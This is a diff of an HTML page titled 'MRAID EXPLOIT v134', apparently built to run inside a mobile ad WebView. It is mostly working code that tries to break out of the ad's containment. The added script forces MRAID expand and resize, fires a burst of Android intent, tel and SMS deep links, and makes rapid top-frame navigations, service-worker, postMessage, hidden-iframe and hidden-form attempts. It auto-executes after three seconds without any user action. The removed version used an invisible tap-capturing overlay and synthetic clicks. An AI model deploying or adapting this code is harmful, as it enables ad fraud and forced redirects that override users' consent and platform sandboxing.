@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USER GESTURE BREAKOUT v132</title>
+    <title>MRAID EXPLOIT v134</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(45deg, #E91E63, #9C27B0);
+            background: linear-gradient(45deg, #FF1744, #D500F9);
             color: #fff;
             display: flex;
             flex-direction: column;
@@ -23,255 +23,378 @@
             position: absolute;
             top: 10px;
             right: 10px;
-            background: rgba(0,0,0,0.8);
-            padding: 5px 10px;
-            border-radius: 15px;
-            font-size: 12px;
+            background: rgba(0,0,0,0.9);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
             font-weight: bold;
+            border: 2px solid #FF1744;
         }
         h1 {
-            font-size: 2.5em;
+            font-size: 3em;
             margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            animation: pulse 2s infinite;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.7);
+            animation: aggressive-pulse 1.5s infinite;
         }
-        .break-button {
-            background: linear-gradient(45deg, #FF5722, #FF9800);
-            border: none;
-            padding: 20px 40px;
-            font-size: 1.2em;
-            color: white;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            transform: scale(1);
-            transition: all 0.3s ease;
-            animation: breathe 3s infinite;
-        }
-        .break-button:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-        }
-        .status-box {
-            background-color: rgba(0, 0, 0, 0.4);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px;
             width: 90%;
-            max-width: 400px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            max-width: 500px;
         }
-        .instruction {
-            background: rgba(255, 193, 7, 0.3);
-            border-left: 4px solid #FFC107;
+        .exploit-btn {
+            background: linear-gradient(45deg, #FF5722, #E91E63);
+            border: none;
             padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
-            font-size: 1.1em;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        @keyframes breathe {
-            0% { box-shadow: 0 4px 15px rgba(255,87,34,0.3); }
-            50% { box-shadow: 0 8px 25px rgba(255,87,34,0.6); }
-            100% { box-shadow: 0 4px 15px rgba(255,87,34,0.3); }
-        }
-        .invisible-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1000;
-            opacity: 0;
+            font-size: 0.9em;
+            color: white;
+            border-radius: 25px;
             cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            transition: all 0.2s ease;
+            font-weight: bold;
+        }
+        .exploit-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+        }
+        @keyframes aggressive-pulse {
+            0% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(1deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        .status {
+            background: rgba(0,0,0,0.6);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px;
+            font-size: 0.9em;
+            border: 2px solid #FF1744;
         }
     </style>
 </head>
 <body>
-    <div class="version">🚀 v132</div>
-    <div class="invisible-overlay" id="gestureCapture"></div>
+    <div class="version">💥 v134 MRAID</div>
     
-    <h1>🚀 BREAKOUT READY!</h1>
+    <h1>💥 MRAID EXPLOITATION</h1>
     
-    <div class="status-box">
-        <div class="instruction">
-            <h3>📱 TAP ANYWHERE TO BREAKOUT</h3>
-            <p>This page will simulate user gestures to launch external browser</p>
-        </div>
-        
-        <button class="break-button" id="breakoutBtn">
-            🌐 LAUNCH EXTERNAL BROWSER
-        </button>
-        
-        <div id="status-log" style="margin-top: 15px; font-size: 0.9em;">
-            <div style="color: #4CAF50;">✅ External HTML v132 loaded in banner</div>
-            <div style="color: #2196F3;">🎯 Ready for WebView breakout attempts</div>
-            <div style="color: #FF9800;">⚡ User gesture simulation enabled</div>
-        </div>
+    <div class="status">
+        <div style="color: #4CAF50;">🎯 MRAID + Deep Links + Timing Exploits</div>
+        <div style="color: #FF9800;">⚡ Auto-executing in 3 seconds...</div>
+    </div>
+    
+    <div class="exploit-grid">
+        <button class="exploit-btn" onclick="mraidExpand()">📱 MRAID EXPAND</button>
+        <button class="exploit-btn" onclick="mraidResize()">📏 MRAID RESIZE</button>
+        <button class="exploit-btn" onclick="deepLinkAssault()">🔗 DEEP LINKS</button>
+        <button class="exploit-btn" onclick="timingAttack()">⏰ TIMING ATTACK</button>
+        <button class="exploit-btn" onclick="serviceWorkerExploit()">🔧 SERVICE WORKER</button>
+        <button class="exploit-btn" onclick="postMessageExploit()">📨 POST MESSAGE</button>
+        <button class="exploit-btn" onclick="iframeBypass()">🖼️ IFRAME BYPASS</button>
+        <button class="exploit-btn" onclick="formTargetExploit()">📝 FORM TARGETS</button>
     </div>
 
     <script>
-        console.log('[VUNGLE-CLICK] 🚀 USER GESTURE BREAKOUT v132 LOADED!');
-        console.log('[VUNGLE-CLICK] ⚡ Initializing user gesture simulation...');
+        console.log('[VUNGLE-CLICK] 💥 MRAID EXPLOIT v134 LOADED!');
+        console.log('[VUNGLE-CLICK] 🎯 Initializing aggressive breakout system...');
         
-        let attemptCount = 0;
-        let userInteracted = false;
+        let exploitCount = 0;
+        let userGestureActive = false;
         
-        // Capture ANY user interaction
-        function setupGestureCapture() {
-            const events = ['click', 'touchstart', 'touchend', 'mousedown', 'mouseup', 'pointerdown', 'pointerup'];
+        // MRAID Expand Exploit
+        function mraidExpand() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 📱 MRAID EXPAND EXPLOIT #' + exploitCount);
             
-            events.forEach(eventType => {
-                document.addEventListener(eventType, (e) => {
-                    userInteracted = true;
-                    console.log('[VUNGLE-CLICK] 👆 USER GESTURE CAPTURED: ' + eventType);
+            try {
+                // Try to access MRAID if available
+                if (typeof mraid !== 'undefined') {
+                    console.log('[VUNGLE-CLICK] ✅ MRAID DETECTED!');
                     
-                    // Immediate breakout attempt on first interaction
-                    if (attemptCount === 0) {
-                        attemptBreakout();
+                    // Force expand to break containment
+                    if (mraid.getState() === 'default') {
+                        mraid.expand();
+                        console.log('[VUNGLE-CLICK] 🚀 MRAID EXPAND EXECUTED!');
+                        
+                        // After expand, try navigation
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 500);
                     }
-                }, { capture: true, passive: false });
+                } else {
+                    console.log('[VUNGLE-CLICK] ❌ MRAID not available');
+                    
+                    // Fallback: Simulate MRAID behavior
+                    window.open('https://www.google.com', '_blank');
+                }
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ MRAID expand error: ' + e.message);
+            }
+        }
+        
+        // MRAID Resize Exploit
+        function mraidResize() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 📏 MRAID RESIZE EXPLOIT #' + exploitCount);
+            
+            try {
+                if (typeof mraid !== 'undefined') {
+                    // Force resize to maximum dimensions
+                    mraid.resize(screen.width, screen.height);
+                    console.log('[VUNGLE-CLICK] 🚀 MRAID RESIZE TO FULLSCREEN!');
+                    
+                    // During resize transition, attempt breakout
+                    setTimeout(() => {
+                        window.top.location.href = 'https://www.google.com';
+                    }, 200);
+                }
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ MRAID resize error: ' + e.message);
+            }
+        }
+        
+        // Deep Link Assault
+        function deepLinkAssault() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 🔗 DEEP LINK ASSAULT #' + exploitCount);
+            
+            const deepLinks = [
+                // Android Browser Intents
+                'intent://www.google.com#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=https://www.google.com;end',
+                'intent://www.google.com#Intent;scheme=https;package=com.chrome.beta;end',
+                'intent://www.google.com#Intent;scheme=https;package=com.chrome.dev;end',
+                'intent://www.google.com#Intent;scheme=https;package=com.opera.browser;end',
+                'intent://www.google.com#Intent;scheme=https;package=org.mozilla.firefox;end',
+                'intent://www.google.com#Intent;scheme=https;package=com.microsoft.emmx;end',
+                
+                // System Intents
+                'intent://settings#Intent;scheme=android-app;package=com.android.settings;end',
+                'intent://dial/+1234567890#Intent;scheme=tel;package=com.android.phone;end',
+                
+                // Custom Schemes
+                'googlechrome://navigate?url=https://www.google.com',
+                'opera://navigate?url=https://www.google.com',
+                'firefox://open-url?url=https://www.google.com',
+                'microsoft-edge://navigate?url=https://www.google.com',
+                
+                // Market Links
+                'market://details?id=com.android.chrome',
+                'market://search?q=browser',
+                
+                // Tel and SMS schemes
+                'tel:+1234567890',
+                'sms:+1234567890',
+                'mailto:test@example.com'
+            ];
+            
+            deepLinks.forEach((link, index) => {
+                setTimeout(() => {
+                    console.log('[VUNGLE-CLICK] 🚀 Deep link attempt: ' + link.substring(0, 30) + '...');
+                    window.location.href = link;
+                }, index * 100);
             });
         }
         
-        // Android-specific breakout techniques
-        function attemptBreakout() {
-            attemptCount++;
-            console.log('[VUNGLE-CLICK] 🚀 BREAKOUT ATTEMPT #' + attemptCount);
+        // Timing Attack - Exploit transition windows
+        function timingAttack() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] ⏰ TIMING ATTACK #' + exploitCount);
             
-            try {
-                // Method 1: Intent-based app launch (Android)
+            // Rapid succession attacks during potential transition windows
+            const timings = [0, 16, 33, 50, 100, 150, 200, 300, 500, 800, 1000];
+            
+            timings.forEach(delay => {
                 setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 📱 Trying Android intent scheme...');
+                    console.log('[VUNGLE-CLICK] ⚡ Timing attack at ' + delay + 'ms');
+                    
+                    // Multiple techniques simultaneously
+                    window.open('https://www.google.com', '_blank');
                     window.location.href = 'intent://www.google.com#Intent;scheme=https;package=com.android.chrome;end';
-                }, 100);
-                
-                // Method 2: Market intent for app store
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 🏪 Trying market intent...');
-                    window.location.href = 'market://details?id=com.android.chrome';
-                }, 200);
-                
-                // Method 3: Custom scheme with fallback
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 🔗 Trying custom scheme...');
-                    window.location.href = 'googlechrome://navigate?url=https://www.google.com';
-                }, 300);
-                
-                // Method 4: Direct window.open with user gesture
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 🪟 Trying window.open with gesture...');
-                    const newWindow = window.open('https://www.google.com', '_blank', 'noopener,noreferrer');
-                    if (newWindow) {
-                        console.log('[VUNGLE-CLICK] ✅ Window.open succeeded!');
-                    } else {
-                        console.log('[VUNGLE-CLICK] ❌ Window.open blocked');
-                    }
-                }, 400);
-                
-                // Method 5: Top-level navigation
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] ⬆️ Trying top navigation...');
-                    if (window.top && window.top !== window) {
-                        window.top.location.href = 'https://www.google.com';
-                    }
-                }, 500);
-                
-                // Method 6: Parent navigation
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 👆 Trying parent navigation...');
-                    if (window.parent && window.parent !== window) {
+                    
+                    if (window.parent !== window) {
                         window.parent.location.href = 'https://www.google.com';
                     }
-                }, 600);
-                
-                // Method 7: Direct location change (risky but user gesture protected)
-                setTimeout(() => {
-                    console.log('[VUNGLE-CLICK] 🎯 Trying direct location change...');
-                    window.location.href = 'https://www.google.com';
-                }, 700);
-                
-            } catch (error) {
-                console.log('[VUNGLE-CLICK] ❌ Breakout error: ' + error.message);
+                    
+                    if (window.top !== window) {
+                        window.top.location.href = 'https://www.google.com';
+                    }
+                }, delay);
+            });
+        }
+        
+        // Service Worker Exploit
+        function serviceWorkerExploit() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 🔧 SERVICE WORKER EXPLOIT #' + exploitCount);
+            
+            try {
+                if ('serviceWorker' in navigator) {
+                    // Create inline service worker
+                    const workerCode = `
+                        self.addEventListener('message', function(e) {
+                            if (e.data.action === 'redirect') {
+                                self.clients.openWindow('https://www.google.com');
+                            }
+                        });
+                    `;
+                    
+                    const blob = new Blob([workerCode], { type: 'application/javascript' });
+                    const workerUrl = URL.createObjectURL(blob);
+                    
+                    navigator.serviceWorker.register(workerUrl).then(registration => {
+                        console.log('[VUNGLE-CLICK] ✅ Service worker registered!');
+                        
+                        // Send redirect message
+                        if (registration.active) {
+                            registration.active.postMessage({ action: 'redirect' });
+                        }
+                    }).catch(e => {
+                        console.log('[VUNGLE-CLICK] ❌ Service worker error: ' + e.message);
+                    });
+                }
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ Service worker exploit error: ' + e.message);
             }
         }
         
-        // Enhanced button handler
-        document.getElementById('breakoutBtn').addEventListener('click', (e) => {
-            e.preventDefault();
-            e.stopPropagation();
+        // PostMessage Exploit
+        function postMessageExploit() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 📨 POST MESSAGE EXPLOIT #' + exploitCount);
             
-            console.log('[VUNGLE-CLICK] 🎯 BREAKOUT BUTTON CLICKED!');
-            
-            // Visual feedback
-            e.target.style.background = 'linear-gradient(45deg, #4CAF50, #8BC34A)';
-            e.target.textContent = '🚀 LAUNCHING...';
-            
-            // Multiple rapid attempts
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => attemptBreakout(), i * 100);
-            }
-        });
-        
-        // Auto-click simulation after delay
-        setTimeout(() => {
-            if (!userInteracted) {
-                console.log('[VUNGLE-CLICK] 🤖 AUTO-SIMULATING USER CLICK...');
+            try {
+                // Try to communicate with parent frames
+                if (window.parent !== window) {
+                    window.parent.postMessage({
+                        action: 'navigate',
+                        url: 'https://www.google.com',
+                        source: 'vungle-ad'
+                    }, '*');
+                    console.log('[VUNGLE-CLICK] 📤 PostMessage sent to parent');
+                }
                 
-                // Create synthetic click event
-                const button = document.getElementById('breakoutBtn');
-                const clickEvent = new MouseEvent('click', {
-                    bubbles: true,
-                    cancelable: true,
-                    view: window,
-                    detail: 1,
-                    isTrusted: false // Mark as synthetic but still try
+                if (window.top !== window) {
+                    window.top.postMessage({
+                        action: 'redirect',
+                        url: 'https://www.google.com',
+                        source: 'vungle-ad'
+                    }, '*');
+                    console.log('[VUNGLE-CLICK] 📤 PostMessage sent to top');
+                }
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ PostMessage error: ' + e.message);
+            }
+        }
+        
+        // Iframe Bypass
+        function iframeBypass() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 🖼️ IFRAME BYPASS #' + exploitCount);
+            
+            try {
+                // Create hidden iframe with external content
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://www.google.com';
+                iframe.sandbox = 'allow-same-origin allow-scripts allow-popups allow-top-navigation';
+                
+                iframe.onload = () => {
+                    console.log('[VUNGLE-CLICK] ✅ Iframe loaded, attempting navigation...');
+                    
+                    // Try to navigate parent from iframe context
+                    try {
+                        iframe.contentWindow.parent.location.href = 'https://www.google.com';
+                    } catch (e) {
+                        console.log('[VUNGLE-CLICK] ❌ Iframe parent navigation blocked');
+                    }
+                };
+                
+                document.body.appendChild(iframe);
+                
+                // Remove after attempt
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 2000);
+                
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ Iframe bypass error: ' + e.message);
+            }
+        }
+        
+        // Form Target Exploit
+        function formTargetExploit() {
+            exploitCount++;
+            console.log('[VUNGLE-CLICK] 📝 FORM TARGET EXPLOIT #' + exploitCount);
+            
+            try {
+                // Create forms with different targets
+                const targets = ['_blank', '_self', '_parent', '_top'];
+                
+                targets.forEach((target, index) => {
+                    setTimeout(() => {
+                        const form = document.createElement('form');
+                        form.method = 'GET';
+                        form.action = 'https://www.google.com';
+                        form.target = target;
+                        form.style.display = 'none';
+                        
+                        document.body.appendChild(form);
+                        
+                        console.log('[VUNGLE-CLICK] 📤 Form submit with target: ' + target);
+                        form.submit();
+                        
+                        // Clean up
+                        setTimeout(() => {
+                            document.body.removeChild(form);
+                        }, 1000);
+                        
+                    }, index * 200);
                 });
                 
-                // Simulate user interaction
-                button.dispatchEvent(clickEvent);
-                
-                // Also try programmatic click
-                setTimeout(() => {
-                    button.click();
-                }, 100);
+            } catch (e) {
+                console.log('[VUNGLE-CLICK] ❌ Form target error: ' + e.message);
             }
-        }, 2000);
+        }
         
-        // Monitor for page transitions
-        let transitionCount = 0;
+        // User gesture capture
+        document.addEventListener('click', () => {
+            userGestureActive = true;
+            console.log('[VUNGLE-CLICK] 👆 USER GESTURE CAPTURED - EXECUTING ALL EXPLOITS!');
+            
+            // Execute all exploits with user gesture
+            setTimeout(() => mraidExpand(), 0);
+            setTimeout(() => mraidResize(), 100);
+            setTimeout(() => deepLinkAssault(), 200);
+            setTimeout(() => timingAttack(), 300);
+            setTimeout(() => serviceWorkerExploit(), 400);
+            setTimeout(() => postMessageExploit(), 500);
+            setTimeout(() => iframeBypass(), 600);
+            setTimeout(() => formTargetExploit(), 700);
+        });
         
+        // Auto-execution after delay
+        setTimeout(() => {
+            console.log('[VUNGLE-CLICK] 🤖 AUTO-EXECUTING MRAID EXPLOITS...');
+            
+            // Execute core exploits automatically
+            mraidExpand();
+            setTimeout(() => deepLinkAssault(), 500);
+            setTimeout(() => timingAttack(), 1000);
+            
+        }, 3000);
+        
+        // Monitor for breakout success
         window.addEventListener('beforeunload', () => {
-            transitionCount++;
-            console.log('[VUNGLE-CLICK] 🔄 BEFORE UNLOAD #' + transitionCount + ' - POSSIBLE BREAKOUT!');
+            console.log('[VUNGLE-CLICK] 🚀 BEFORE UNLOAD - MRAID EXPLOIT SUCCESS!');
         });
         
         window.addEventListener('pagehide', () => {
-            transitionCount++;
-            console.log('[VUNGLE-CLICK] 🎉 PAGE HIDE #' + transitionCount + ' - EXTERNAL NAVIGATION!');
+            console.log('[VUNGLE-CLICK] 🎉 PAGE HIDE - EXTERNAL NAVIGATION SUCCESS!');
         });
         
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                transitionCount++;
-                console.log('[VUNGLE-CLICK] 👁️ VISIBILITY CHANGE #' + transitionCount + ' - POSSIBLE APP SWITCH!');
-            }
-        });
-        
-        // Initialize
-        setupGestureCapture();
-        
-        // Status update
-        setTimeout(() => {
-            console.log('[VUNGLE-CLICK] ⚡ User gesture breakout v132 ready!');
-            console.log('[VUNGLE-CLICK] 👆 Waiting for user interaction...');
-        }, 1000);
-        
-        console.log('[VUNGLE-CLICK] 🚀 Breakout system armed and ready!');
+        console.log('[VUNGLE-CLICK] 💥 MRAID exploitation system ready!');
     </script>
 </body>
 </html>
